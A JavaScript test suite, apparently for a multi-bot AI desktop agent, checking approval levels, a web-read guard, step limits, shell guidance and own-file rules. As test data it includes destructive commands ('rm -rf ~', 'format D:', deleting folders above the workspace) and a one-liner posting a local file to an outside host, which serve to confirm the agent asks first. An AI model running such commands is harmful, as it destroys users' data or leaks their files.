  const media = r.ev.find((e) => e.type === 'turn.start' && e.source === 'media');
  // At work: into that turn.
  const busy = { controller: new AbortController(), botId: 'g67pub', task: '剪片', startedAt: Date.now(), inbox: [], depth: 0, working: true };
  r.rt.active.set('turn_g67_busy', busy);
  const into = await r.rt.jobFinished({ botId: 'g67pub', createdAt: before, line: '视频生成好了：videos/c3.mp4' });
  r.rt.active.delete('turn_g67_busy');
  const [server, tools] = await Promise.all([readText('../src/server.mjs'), readText('../src/tools.mjs')]);
  const hook = server.slice(server.indexOf('const jobEnded = async (job) => {'), server.indexOf('refs.videoJobs = createVideoJobs({'));
  check('G67-5a a background video finished after the bot had moved on starts no turn (its next turn is told, quietly); one of a batch still being made waits for the rest; when its work waits on it, ONE turn - not 「告诉用户」; while it works, a quiet note goes into that turn',
    noted === 'noted' && noTurn && /后台任务在你上一轮之后做完了/.test(knew) && /videos\/c1\.mp4/.test(knew) && held === 'held' && waits === 'turn'
    && Boolean(media) && !/告诉用户/.test(media?.text || '') && into === 'into-turn' && busy.inbox[0]?.kind === 'job',
    JSON.stringify({ noted, noTurn, held, waits, into, media: String(media?.text || '').slice(0, 80) }));
  check('G67-5b the server reports a finished or failed video through that one path, a batch together (by the turn that asked), its file the bot\'s own; nothing tells the bot 「告诉用户」 per clip',
    server.includes('onDone: jobEnded,') && server.includes('onFail: jobEnded,') && !/告诉用户/.test(hook) && hook.includes('runtime.ownFilesFor().note(job.botId, job.path)')
    && tools.includes('turnId: ctx.turnId || null })') && !tools.includes('Tell the human that now and end your turn'));
  r.done();
}

export async function talkLessChecks({ check, toolsMod, groupsMod }) {
  const QUESTION = '视频标记选哪个？「AI 生成」还是「无需标记」？';
  const r = await teamRig({
    toolsMod, groupsMod,
    script: ({ who, messages }) => {
      if (who !== 'pub') return say('好。');
      const n = messages.filter((m) => m.role === 'tool').length;
      const again = messages.some((m) => m.role === 'user' && /换一个/.test(String(m.content || '')));
      if (!n) return call('tell_human', { text: QUESTION });
      return say(again ? '甲站发好了，乙站等你选视频标记。' : '需要你决定：视频标记选「AI 生成」还是「无需标记」，选好我就发。');
    },
  });
  await r.rt.runTurn({ botId: 'g67pub', text: '发甲站', source: 'chat', turnId: 'turn_g67_ask' });
  const shown = r.ev.filter((e) => e.type === 'message' && e.final && e.turnId === 'turn_g67_ask').map((e) => e.text);
  const sys = String(r.calls.find((c) => c.who === 'pub')?.all || '');
  await r.rt.runTurn({ botId: 'g67pub', text: '换一个：再问一次，然后发甲站', source: 'chat', turnId: 'turn_g67_ask2' });
  const shown2 = r.ev.filter((e) => e.type === 'message' && e.final && e.turnId === 'turn_g67_ask2').map((e) => e.text);
  check('G67-6 every bot is told to talk less: speak when done, stuck or needing a decision; no notes while working or waiting; done = ONE message, the result and a sentence or two, no specs or step recap unless asked',
    /Talk less\. Speak only when the work is done, you are stuck, or the human must decide\./.test(sys) && /When done: ONE message/.test(sys) && /趁等待我先/.test(sys));
  check('G67-7 a final reply that only says again what tell_human just asked is not sent (one message: the question); a final reply with something new still is',
    shown.length === 1 && /【需要你拍板】/.test(shown[0]) && shown2.length === 2 && shown2.some((t) => /甲站发好了/.test(t)),
    JSON.stringify({ shown, shown2 }));
  r.done();
}

// ---------------------------------------------------------------------------
// G67-8: the three levels, cell by cell - the table the human agreed to on 11-24 (「可以，先这样试一下」),
// shown in 设置 next to the level picker:
//                                         谨慎   标准                               放手
//   its own files (write, change, delete)  问     直接做                             直接做
//   scripts, pictures/videos, downloads    问     直接做                             直接做
//   changing things after a web read       问     只有往外发、碰你的文件才问(这一轮都允许)  不问，只有往外发才问
//   your own files, outside the workspace  问     问                                 直接做
//   publishing, sending, forms             问     问                                 问
//   money, QR logins, truly dangerous      问     问                                 问
// ---------------------------------------------------------------------------
const LEVELS = [['谨慎', 'careful'], ['标准', ''], ['放手', 'auto']];

export async function levelChecks({ check, toolsMod, groupsMod, readText }) {
  /** How many cards `steps` raise at each level (setup(ws) runs first; a short wait makes what it wrote older than the work). */
  // chain: the human answers a card that offers 「这一轮都允许」 with it.
  const cell = async (steps, { setup = null, policy = {}, chain = false } = {}) => {
    const out = {};
    for (const [word, level] of LEVELS) {
      const r = await workRig({ toolsMod, groupsMod, steps, level });
      Object.assign(r.rt.config.policy, policy);
      if (chain) {
        r.rt.approvals.request = (req) => { r.cards.push(req); const p = Promise.resolve({ decision: 'approved', approval: { id: `ap_${r.cards.length}`, chainAllowed: Boolean(req.chainScope) } }); p.record = { id: `ap_${r.cards.length}` }; return p; };
      }
      if (setup) { await setup(r.ws); await sleep(300); }
      await r.rt.runTurn({ botId: 'g67pub', text: '做吧', source: 'chat' });
      out[word] = { cards: r.cards.length, chain: r.cards.map((c) => c.chainScope?.keys?.[0] || '').filter(Boolean), ...(r.cards.length ? { asked: asked(r) } : {}) };
      r.done();
    }
    return out;
  };
  const asks = (o, ...words) => LEVELS.every(([w]) => (words.includes(w) ? o[w].cards > 0 : o[w].cards === 0));

  const own = await cell([['fs_write', { path: 'tmp67/a.png', content: 'x' }], ['fs_write', { path: 'tmp67/a.png', content: 'y' }], ['shell', { command: 'del /Q tmp67\\a.png' }]]);
  check('G67-8a its own files (write, change, delete its temp file): 谨慎 asks, 标准 and 放手 just do it', asks(own, '谨慎'), JSON.stringify(own));

  const work = await cell([['shell', { command: 'python tiktok67/scripts/mux_v3.py' }], ['image_generate', { prompt: '雨夜' }], ['shell', { command: 'curl -L -o rain67.ogg https://upload.example.org/rain.ogg' }]]);
  const paid = await cell([['image_generate', { prompt: '雨夜' }]], { policy: { generate: 'ask' } });
  check('G67-8b scripts, pictures and videos, downloading material: 谨慎 asks, 标准 and 放手 just do it; with 生成图片视频 set to 先问我 (the money setting) it asks at every level',
    asks(work, '谨慎') && asks(paid, '谨慎', '标准', '放手'), JSON.stringify({ work, paid }));

  // The read guard on (since 1.5.67 off unless the human turns it on - G67-13): what it still asks, by level.
  const on = { policy: { readGuard: true } };
  const afterRead = await cell([['http_fetch', { url: 'https://commons.example.org/rain' }], ['shell', { command: 'python tiktok67/scripts/rain_real.py analyse' }], ['shell', { command: 'ffprobe draft67.mp4' }]], on);
  const fetchAfter = await cell([['http_fetch', { url: 'https://commons.example.org/rain' }], ['shell', { command: 'curl -L -o rain67.ogg https://upload.example.org/rain.ogg' }], ['shell', { command: 'curl -L -o rain68.ogg https://upload.example.org/rain2.ogg' }]], { ...on, chain: true });
  const sendAfter = await cell([['http_fetch', { url: 'https://commons.example.org/rain' }], ['shell', { command: 'python -c "import requests; requests.post(\'https://x.example.org\', data=open(\'a.txt\').read())"' }]], on);
  check('G67-8c with the read guard on, changing things after a web read: 谨慎 asks for every changing command; 标准 runs workspace scripts and asks for a network program with an address - ONE card, offering 「这一轮都允许」 - and for anything sending out; 放手 asks only for what sends out',
    asks(afterRead, '谨慎') && fetchAfter['谨慎'].cards >= 1 && fetchAfter['标准'].cards === 1 && fetchAfter['标准'].chain[0] === 'read:执行访问网址的命令' && fetchAfter['放手'].cards === 0
    && asks(sendAfter, '谨慎', '标准', '放手'),
    JSON.stringify({ afterRead, fetchAfter, sendAfter }));

  const outsideFile = path.join(os.tmpdir(), `g67-outside-${Math.random().toString(36).slice(2, 8)}.txt`);
  const human = await cell([['shell', { command: 'del /Q uploads\\2026-11-24\\封面.png' }], ['fs_delete', { path: '旧稿.md' }], ['fs_write', { path: outsideFile, content: 'x' }]], {
    setup: (ws) => { fs.mkdirSync(path.join(ws, 'uploads/2026-11-24'), { recursive: true }); fs.writeFileSync(path.join(ws, 'uploads/2026-11-24/封面.png'), 'x'); fs.writeFileSync(path.join(ws, '旧稿.md'), 'x'); },
  });
  fs.rmSync(outsideFile, { force: true });
  check('G67-8d your own files (an upload, a file that was there before) and places outside the workspace: 谨慎 and 标准 ask, 放手 just does it (an upload is still never written over - 1.5.64)',
    asks(human, '谨慎', '标准') && (await readText('../src/keepuploads.mjs')).includes('A bot never silently replaces a'), JSON.stringify(human));

  const publish = await cell([['post_draft', { channel: '甲站', title: '第一次打开', body: '正文' }], ['http_fetch', { url: 'https://example.org/apply', method: 'POST', body: 'a=1' }]]);
  check('G67-8e publishing, sending, submitting a form: asked at every level', asks(publish, '谨慎', '标准', '放手') && LEVELS.every(([w]) => publish[w].cards === 2), JSON.stringify(publish));

  const above = await cell([['shell', { command: `rmdir /S /Q ${path.dirname(os.tmpdir())}` }], ['shell', { command: 'format D: /q' }], ['shell', { command: 'rm -rf ~' }]]);
  check('G67-8f truly dangerous commands (a folder above the workspace, format, the home folder) ask at every level - also at 放手 on this computer',
    asks(above, '谨慎', '标准', '放手') && LEVELS.every(([w]) => above[w].cards === 3), JSON.stringify(above));

  const O = await import('../src/ownfiles.mjs');
  const ws = path.join(os.tmpdir(), 'g67ws');
  const home = path.join(path.parse(os.tmpdir()).root, 'Users', 'someone');
  const d = (p) => O.dangerousPlace(p, { workspaceDir: ws, dataDir: path.join(home, 'AppData', 'Roaming', 'Desk', 'data'), home });
  check('G67-8g what is a truly dangerous place to delete or move at 放手: a drive root, the workspace or above, the home folder and its top folders, Lamplit\'s data, system folders - not a file in the workspace or a folder of the human\'s further down',
    d(path.parse(os.tmpdir()).root) && d(ws) && d(path.dirname(ws)) && d(home) && d(path.join(home, 'Documents')) && d(path.join(home, 'AppData', 'Roaming', 'Desk', 'data', 'x.json'))
    && (process.platform === 'win32' ? d('C:\\Windows\\Temp\\x') : d('/etc/hosts')) && !d(path.join(ws, 'tmp', 'a.png')) && !d(path.join(home, 'Documents', '项目', 'old.md')));

  const [page, agent, boundary] = await Promise.all([readText('../public/index.html'), readText('../src/agent.mjs'), readText('../src/boundary.mjs')]);
  // 设置 itself is not changed (the human, 11-24: 「其他的不要动呀」): the levels keep their words, no table on the page.
  check('G67-8h 设置 → 审批 is as it was (the levels\' own words, no table - the table is in the release note); 放手 is the same on this computer as on a machine given to the bots (设置 → 边界 「工作区以外一律不许」 still holds)',
    !page.includes('level-table') && page.includes('<small>删文件、执行命令、发消息、改设置等有影响的操作，每次都先问我（所有机器人一样）。</small>')
    && page.includes('<small>都让机器人自己做，只有危险命令还会问我。适合专门给机器人用的电脑。</small>')
    && boundary.includes("const free = autonomous && (remote || policy.outside !== 'deny');") && agent.includes("const readLevel = machine.careful ? 'careful' : machine.autonomous ? 'auto' : 'standard';"));
}

// ---------------------------------------------------------------------------
// G67-9: two more live cases (11-24 07:09-07:12, TikTok运营, seven cards)
// ---------------------------------------------------------------------------
export async function liveCaseChecks({ check, toolsMod, groupsMod, readText }) {
  // 1. 放手, 「以后都允许」 for python, a web read, then its own script: no card (5 such cards there).
  {
    const r = await workRig({ toolsMod, groupsMod, level: 'auto', steps: [
      ['http_fetch', { url: 'https://commons.example.org/rain' }],
      ['shell', { command: 'python tiktok67/scripts/x.py --in draft67.mp4 --out out67.mp4' }],
      ['shell', { command: 'ffmpeg -i draft67.mp4 -y out67b.mp4' }],
    ] });
    r.bots.get('g67pub').policy.allowed = [{ key: 'shell:python', label: '用 python 运行命令' }];
    r.rt.config.policy.readGuard = true; // as it was then: the switch on
    await r.rt.runTurn({ botId: 'g67pub', text: '把雨声混进去', source: 'chat' });
    check('G67-9a at 放手, with 「以后都允许」 for python, after reading a web page its own script and ffmpeg on its drafts run without a card (the read guard asks only for what sends out)',
      r.cards.length === 0 && r.ran.filter(([n]) => n === 'shell').length === 2, JSON.stringify(asked(r)));
    r.done();
  }

  // 2. An installed program named by its path is not "a place not opened"; its file arguments still are.
  {
    const B = await import('../src/boundary.mjs');
    const win = process.platform === 'win32';
    const ws = win ? 'C:\\Users\\someone\\ws' : '/home/someone/ws';
    const exe = win ? 'C:\\ffmpeg\\bin\\ffmpeg.exe' : '/home/someone/tools/ffmpeg/bin/ffmpeg';
    const user = win ? '"C:\\Users\\someone\\AppData\\Local\\Programs\\ffmpeg\\bin\\ffprobe.exe"' : '/home/someone/.local/programs/ffmpeg/bin/ffprobe';
    const videos = win ? 'C:\\Users\\someone\\Videos\\x.mp4' : '/home/someone/Videos/x.mp4';
    const asks = (command) => Boolean(B.checkBoundary('shell', { command }, { workspaceDir: ws, policy: {}, remote: false, autonomous: false }));
    const runs = [`${exe} -i draft.mp4 -y out.mp4`, `${user} draft.mp4`, `${exe} -version`, `python tiktok\\scripts\\mux_v3.py --ffmpeg ${exe}`, `cd ${path.dirname(exe)} && ${path.basename(exe)} -version`];
    const stillAsks = [`${exe} -i ${videos} out.mp4`, `ffmpeg -i draft.mp4 ${videos}`, `copy evil.exe ${exe}`, `del ${exe}`];
    const wrong = [...runs.filter(asks).map((c) => `asked: ${c}`), ...stillAsks.filter((c) => !asks(c)).map((c) => `ran: ${c}`)];
    check('G67-9b running or probing an installed program by its path (C:\\ffmpeg\\bin\\ffmpeg.exe, …\\AppData\\Local\\Programs\\…\\ffprobe.exe, passed to a script, cd into its bin) is not a place outside the workspace; reading or writing the human\'s files with it, or changing the program\'s files, still asks',
      wrong.length === 0 && B.programPlace(exe) && !B.programPlace(videos), JSON.stringify(wrong));
  }
}

// ---------------------------------------------------------------------------
// G67-10: the step limit (11-24, TikTok: 「这一轮已经做了 80 步，到了单轮的上限…我会自动接着做，不用回「继续」」 in the chat)
// ---------------------------------------------------------------------------
export async function stepLimitChecks({ check, toolsMod, groupsMod }) {
  const A = await import('../src/agent.mjs');
  check('G67-10a every bot gets 150 steps a turn (a video bot with commands and generation too, not 80), its own setting up to 300',
    A.stepLimitFor({ tools: ['shell', 'image_generate', 'video_generate'], policy: {} }) === 150 && A.stepLimitFor({ tools: [], policy: { maxSteps: 80 } }) === 150
    && A.stepLimitFor({ tools: [], policy: { maxSteps: 260 } }) === 260 && A.stepLimitFor({ tools: [], policy: { maxSteps: 999 } }) === 300);

  /** A turn that never finishes by itself; `used`: automatic go-ons it already had. -> what the chat showed, its status, the next turn. */
  const hitLimit = async (used) => {
    const r = await teamRig({ toolsMod, groupsMod, script: ({ who, messages }) => (who === 'pub' ? call('fs_list', { path: `nowhere-${messages.length}` }) : say('好。')) });
    if (used) r.rt.limitRuns = new Map([['g67pub', used]]);
    const next = [];
    // An automatic go-on is a 'task' turn (a message from the human starts the count again).
    const res = await r.rt.runTurn({ botId: 'g67pub', text: '把素材都剪好', source: used ? 'task' : 'chat' });
    r.rt.runTurn = async (o) => { next.push(o); return {}; };
    await sleep(120);
    const said = r.ev.filter((e) => e.type === 'message' && e.system && e.botId === 'g67pub').map((e) => e.text);
    r.done();
    return { res, said, next };
  };
  const goesOn = await hitLimit(0);
  const stops = await hitLimit(6);
  check('G67-10b reaching the step limit and going on by itself is not said in the chat - the turn\'s status keeps it (「…我会自动接着做」); when the go-ons run out it is said in the chat, with 「回一句「继续」」',
    goesOn.res.status === 'max_steps' && goesOn.res.steps === 150 && goesOn.said.length === 0 && /我会自动接着做（第 1 次，最多 6 次）/.test(goesOn.res.summary) && goesOn.next.length === 1
    && stops.said.length === 1 && /已经自动接着做了 6 次/.test(stops.said[0]) && /回一句「继续」/.test(stops.said[0]) && stops.next.length === 0,
    JSON.stringify({ goesOn: { status: goesOn.res.status, steps: goesOn.res.steps, said: goesOn.said, summary: goesOn.res.summary, next: goesOn.next.length }, stops: { said: stops.said, next: stops.next.length } }));
}

// ---------------------------------------------------------------------------
// G67-11: one rule for every bot (the human, 11-24: 「不要只修改已经有的 bot……要做成一个通用的规则，不要一个一个 bot 去调」)
// - existing bots, bots made later, bots on a machine added later: the code's defaults, nothing written per bot.
// ---------------------------------------------------------------------------
export async function allBotsChecks({ check, toolsMod, groupsMod, readText }) {
  const A = await import('../src/agent.mjs');
  const B = await import('../src/bots.mjs');
  // A bot made now, with nothing set: no step limit stored - the code's 150.
  const made = await B.createBot({ name: 'g67新机器人', role: '剪视频' });
  const fresh = await B.getBot(made.id);
  // A bot from before 1.5.67: every bot had 80 written into its settings - read as not set. A value the human chose stays.
  await B.updateBot(made.id, { policy: { ...fresh.policy, maxSteps: 80 } });
  const old = await B.getBot(made.id);
  await B.updateBot(made.id, { policy: { ...fresh.policy, maxSteps: 220 } });
  const chosen = await B.getBot(made.id);
  await B.deleteBot(made.id).catch(() => {});
  check('G67-11a a bot made now stores no step limit and gets 150; a bot from before with the old default 80 written in gets 150 too; a limit the human chose (220) stays',
    fresh && !('maxSteps' in (fresh.policy || {})) && A.stepLimitFor(fresh) === 150 && !('maxSteps' in (old.policy || {})) && A.stepLimitFor(old) === 150
    && chosen.policy?.maxSteps === 220 && A.stepLimitFor(chosen) === 220,
    JSON.stringify({ fresh: fresh?.policy, old: old?.policy, chosen: chosen?.policy }));

  // A bot on a machine given to the bots, as its settings come from an older install (80 written in, no 「以后都允许」):
  // after the update, the same rules - its own temp files go without a card, the human's files and sends still ask.
  const before = process.env.DESK_MACHINE_MODE;
  process.env.DESK_MACHINE_MODE = 'remote';
  try {
    const r = await workRig({ toolsMod, groupsMod, level: 'standard', steps: [
      ['fs_write', { path: 'tmp67/a.png', content: 'x' }], ['shell', { command: 'del /Q tmp67\\a.png' }], ['shell', { command: 'python make67.py' }],
      ['post_draft', { channel: '甲站', title: '第一次打开', body: '正文' }],
    ] });
    r.bots.get('g67pub').policy = { autoApproveMedium: false, denyPatterns: [], maxSteps: 80 };
    await r.rt.runTurn({ botId: 'g67pub', text: '剪一条，发甲站', source: 'chat' });
    check('G67-11b a bot on another machine (set up there before 1.5.67, no per-bot rules) follows the same rules once that machine updates: its temp file and its script go without a card, the post still asks',
      r.cards.length === 1 && r.cards[0].toolName === 'post_draft' && A.stepLimitFor({ ...r.bots.get('g67pub'), policy: {} }) === 150, JSON.stringify(asked(r)));
    r.done();
  } finally {
    if (before === undefined) delete process.env.DESK_MACHINE_MODE; else process.env.DESK_MACHINE_MODE = before;
  }

  const [agent, bots] = await Promise.all([readText('../src/agent.mjs'), readText('../src/bots.mjs')]);
  check('G67-11c the rules live in shared code, not in a bot: the levels are the machine\'s setting, the talk-less rules and the background-job rule are in the shared prompt and the server, and nothing new reads a per-bot flag; no bot gets 80 steps written in',
    !/maxSteps: Number\(policy\.maxSteps \|\| 80\)/.test(bots) && bots.includes('Number(policy.maxSteps) !== OLD_DEFAULT_STEPS')
    && agent.includes("const readLevel = machine.careful ? 'careful' : machine.autonomous ? 'auto' : 'standard';") && agent.includes("'- Talk less. Speak only when the work is done")
    && !/ownWork\([^)]*bot\.policy/.test(agent));
}

// ---------------------------------------------------------------------------
// G67-12: which shell runs the commands (11-24, TikTok on Windows: 52 of 574 steps failed - `ls -la … | head`, `tail`,
// `for f in …; do`, `2>&1 | head -60` in cmd.exe - and each was tried again in cmd syntax)
// ---------------------------------------------------------------------------
export async function shellChecks({ check, toolsMod, groupsMod }) {
  const S = await import('../src/shellguide.mjs');
  const win = S.shellGuide('win32');
  const nix = S.shellGuide('linux');
  check('G67-12a the model is told plainly which shell runs its commands: on Windows cmd.exe, not bash - no head/tail/grep/ls, no `for x in; do`, no /dev/null - with what to use (dir, type, findstr, `for %f in (…) do`, 2>nul, a .py for longer work); elsewhere /bin/sh',
    /cmd\.exe, NOT bash/.test(win) && /no head, tail, grep/.test(win) && /for %f in \(\*\.mp4\) do/.test(win) && /2>nul/.test(win) && /write a \.py/.test(win) && /\/bin\/sh/.test(nix) && !/cmd\.exe/.test(nix));

  const none = () => false;
  const caught = ['ls -la tiktok | head', 'for f in *.mp4; do ffprobe $f; done', 'ffmpeg -i a.mp4 out.mp4 2>&1 | head -60', 'tail -n 20 log.txt', 'python x.py 2>/dev/null', 'cat a.txt']
    .filter((c) => !S.bashOnWindows(c, { has: none }));
  const passed = ['dir tiktok', 'findstr foo a.txt', 'type a.txt', 'for %f in (*.mp4) do ffprobe "%f"', 'powershell -NoProfile -Command "Get-Content a -Tail 5"', 'python x.py 2>nul', 'ffmpeg -i "草稿 1.mp4" -y out.mp4']
    .filter((c) => S.bashOnWindows(c, { has: none }));
  const withGit = S.bashOnWindows('ls -la | head', { has: () => true });
  check('G67-12b a bash command on Windows is caught before it runs, with the cmd way to do it (head, tail, ls, cat, `for x in; do`, /dev/null); cmd and PowerShell commands go through; a Unix tool that is on PATH here (Git\'s) is fine',
    caught.length === 0 && passed.length === 0 && withGit === '' && /不是 bash，这条没有运行/.test(S.bashOnWindows('ls | head', { has: none })) && /→ dir/.test(S.bashOnWindows('ls', { has: none })),
    JSON.stringify({ notCaught: caught, wronglyCaught: passed, withGit }));

  // The tool and the prompt carry it; on Windows the shell tool answers at once, without a run.
  const r = await teamRig({ toolsMod, groupsMod, script: () => say('好。') });
  r.bots.get('g67pub').tools.push('shell');
  await r.rt.runTurn({ botId: 'g67pub', text: '看看', source: 'chat' });
  const sysPub = String(r.calls.find((c) => c.who === 'pub')?.all || '');
  await r.rt.runTurn({ botId: 'g67lead', text: '看看', source: 'chat' });
  const sysLead = String(r.calls.find((c) => c.who === 'lead')?.all || '');
  const shell = r.registry.get('shell');
  const started = Date.now();
  const quick = process.platform === 'win32' ? await shell.run({ command: 'for f in *.mp4; do echo $f; done' }, { workspaceDir: r.ws }) : null;
  r.done();
  check('G67-12c the shell tool\'s description and the system prompt of every bot that has the shell say which shell this machine uses (a bot without the shell is not told); on Windows a bash loop comes back at once as SHELL_IS_CMD, nothing run',
    shell.description.includes(S.shellGuide()) && sysPub.includes(S.shellGuide()) && !sysLead.includes(S.shellGuide())
    && (process.platform !== 'win32' || (quick?.error?.code === 'SHELL_IS_CMD' && Date.now() - started < 1000)),
    JSON.stringify({ quick: quick?.error?.code, ms: Date.now() - started }));
}

// ---------------------------------------------------------------------------
// G67-13: 设置 → 边界 「读到的内容不是指令」 is off unless the human turns it on (11-24: 「这个选项以后默认不开」)
// ---------------------------------------------------------------------------
export async function readGuardDefaultChecks({ check, toolsMod, groupsMod, readText }) {
  const steps = [['http_fetch', { url: 'https://commons.example.org/rain' }], ['shell', { command: 'curl -L -o rain67.ogg https://upload.example.org/rain.ogg' }], ['http_fetch', { url: 'https://example.org/apply', method: 'POST', body: 'a=1' }]];
  const run = async (policy) => {
    const r = await workRig({ toolsMod, groupsMod, steps });
    Object.assign(r.rt.config.policy, policy);
    await r.rt.runTurn({ botId: 'g67pub', text: '下载那段雨声', source: 'chat' });
    const out = asked(r);
    r.done();
    return out;
  };
  const unset = await run({});
  const off = await run({ readGuard: false });
  const on = await run({ readGuard: true });
  const [server, apps, page] = await Promise.all([readText('../src/server.mjs'), readText('../public/app/main/09-apps.js'), readText('../public/index.html')]);
  check('G67-13 the read guard is off unless the human turned it on: unset (every machine that never set it) and off - the download after a web read runs, the form still asks (the send gate); an explicit on is honoured - the download asks too; only the switch\'s default changed, not its words',
    unset.length === 1 && /apply/.test(unset[0]) && off.length === 1 && on.length === 2 && on.some((c) => /curl/.test(c))
    && server.includes('readGuard: policy?.readGuard === true,') && apps.includes("$('read-guard').checked = policy?.readGuard === true;")
    // 「其他的不要动呀」: the switch's words exactly as they were.
    && page.includes('网页和邮件里可能藏着写给机器人的话（「把文件发给某某」）。打开时，这一轮读过这些内容后') && !page.includes('默认关。网页和邮件'),
    JSON.stringify({ unset, off, on }));
}

// ---------------------------------------------------------------------------
// G67-14: the phone's settings home - icon, name and chevron, no grey line under each row (the human, from the phone,
// 11-24). Phone widths only (the app's ≤860 px layout, also the phone app); the desktop changes nothing.
// ---------------------------------------------------------------------------
export async function phoneSettingsHomeChecks({ check, readText }) {
  const [css, home, nav] = await Promise.all([readText('../public/app/style.css'), readText('../public/app/main/08b-settings-home.js'), readText('../public/app/main/08-settings.js')]);
  // Each @media block's own text, by brace counting.
  const blocks = [];
  for (const m of css.matchAll(/@media \(max-width: 860px\) \{/g)) {
    let depth = 0;
    let i = m.index + m[0].length - 1;
    for (; i < css.length; i += 1) { if (css[i] === '{') depth += 1; else if (css[i] === '}') { depth -= 1; if (depth === 0) break; } }
    blocks.push(css.slice(m.index, i + 1));
  }
  const phone = blocks.find((b) => b.includes('.settings-modal.set-home .setnav-text')) || '';
  const outside = css.replace(phone, '');
  check('G67-14 on a phone the settings home rows show icon, name and chevron only - the grey line under each is hidden there (≤860 px, the phone app too); the lines stay in the page and the desktop still shows them on its settings home; no name changed',
    /\.settings-modal\.set-home \.setnav-note \{ display: none; \}/.test(phone) && !/\.setnav-note \{ display: (block|flex)/.test(phone)
    && /\.setnav-note \{ display: none; \}/.test(outside) && !/set-home \.setnav-note/.test(outside)
    && home.includes("['sec-model', '模型', '它用哪个 AI 思考'],") && home.includes("['sec-run', '审批', '什么时候先问你'],")
    && nav.includes("text.appendChild(el('small', 'setnav-note', note));"));
}

// ---------------------------------------------------------------------------
// G67-15: own-file paths in both forms on any machine (the 1.5.67 release CI on Linux: `del /Q tmp67\a.png` from a
// model was not seen as the bot's own file there). The workspace's own form picks the rules; `\` and `/` both
// separate. Checked with a POSIX and a Windows workspace by name, so it runs the same on every OS.
// ---------------------------------------------------------------------------
export async function pathFormChecks({ check }) {
  const O = await import('../src/ownfiles.mjs');
  const results = {};
  for (const [form, ws, home, outside, data] of [
    ['posix', '/home/u/ws', '/home/u', '/home/u/projects/old', '/home/u/.lamplit/data'],
    ['windows', 'C:\\Users\\u\\ws', 'C:\\Users\\u', 'C:\\Users\\u\\projects\\old', 'C:\\Users\\u\\AppData\\Roaming\\Desk\\data'],
  ]) {
    const own = O.createOwnFiles({ workspaceDir: ws });
    own.note('b', 'tmp67');
    own.note('b', 'cut67.mp4');
    const owns = (r) => own.owns('b', r);
    const d = (p) => O.dangerousPlace(p, { workspaceDir: ws, dataDir: data, home });
    const sep = form === 'windows' ? '\\' : '/';
    results[form] = {
      rel: [O.relIn(ws, 'tmp67\\a.png'), O.relIn(ws, 'tmp67/a.png'), O.relIn(ws, '..\\up'), O.relIn(ws, ws)],
      own: ['del /Q tmp67\\a.png', 'del /Q tmp67\\*.wav && del /F /Q cut67.mp4', 'rmdir /S /Q tmp67', 'rm -rf tmp67/', 'Remove-Item -Recurse -Force tmp67'].map((c) => O.ownDeleteCommand(c, { workspaceDir: ws, owns }).ok),
      notOwn: ['del /Q other.png', 'del /Q *.png', `rmdir /S /Q ${home}`, 'del /Q uploads\\a.png'].map((c) => O.ownDeleteCommand(c, { workspaceDir: ws, owns }).ok),
      danger: [ws, home, `${home}${sep}Documents`, `${data}${sep}x.json`].map(d),
      safe: [`${ws}${sep}tmp${sep}a.png`, `${outside}${sep}a.md`].map(d),
      winOnPosix: form === 'posix' ? [O.relIn(ws, 'C:\\Windows\\x'), d('C:\\x'), O.ownDeleteCommand('del /Q C:\\x.txt', { workspaceDir: ws, owns: () => false, anywhere: (abs) => !d(abs) }).ok] : [null, true, false],
    };
  }
  const ok = (r) => r.rel.join() === 'tmp67/a.png,tmp67/a.png,,' && r.own.every(Boolean) && !r.notOwn.some(Boolean) && r.danger.every(Boolean) && !r.safe.some(Boolean)
    && r.winOnPosix[0] === null && r.winOnPosix[1] === true && r.winOnPosix[2] === false;
  check('G67-15 own-file paths read `tmp67\\a.png` and `tmp67/a.png` alike on a Windows and on a Linux workspace: the bot\'s own temp files are its own, others\' and the human\'s are not, the dangerous places stay dangerous, and a C:\\ place named on a Linux machine is never taken as inside its workspace',
    ok(results.posix) && ok(results.windows), JSON.stringify(results));

  // The boundary on a Linux hub reads absolute paths in a command: cmd's switches (/Q, /S, /F, /A:H) are not folders at the root.
  const B = await import('../src/boundary.mjs');
  const paths = Object.fromEntries(['del /Q tmp67\\a.png', 'del /Q tmp67\\*.wav && del /F /Q cut67.mp4', 'rmdir /S /Q tmp67', 'dir /A:H /B', 'move /Y a.png b.png',
    'del /Q /home/u/x.txt', 'copy /Y a.txt /etc/x', 'rm -rf /Q', 'ls /opt && del /Q a.png'].map((c) => [c, B.unixPathsIn(c)]));
  const none = ['del /Q tmp67\\a.png', 'del /Q tmp67\\*.wav && del /F /Q cut67.mp4', 'rmdir /S /Q tmp67', 'dir /A:H /B', 'move /Y a.png b.png'];
  check('G67-15b on a Linux machine cmd\'s switches (del /Q, rmdir /S /Q, dir /A:H, move /Y) are not places at the root; a real path after them still is, and /Q after a Linux program (rm -rf /Q) is a path',
    none.every((c) => paths[c].length === 0) && paths['del /Q /home/u/x.txt'].join() === '/home/u/x.txt' && paths['copy /Y a.txt /etc/x'].join() === '/etc/x'
    && paths['rm -rf /Q'].join() === '/Q' && paths['ls /opt && del /Q a.png'].join() === '/opt', JSON.stringify(paths));
}
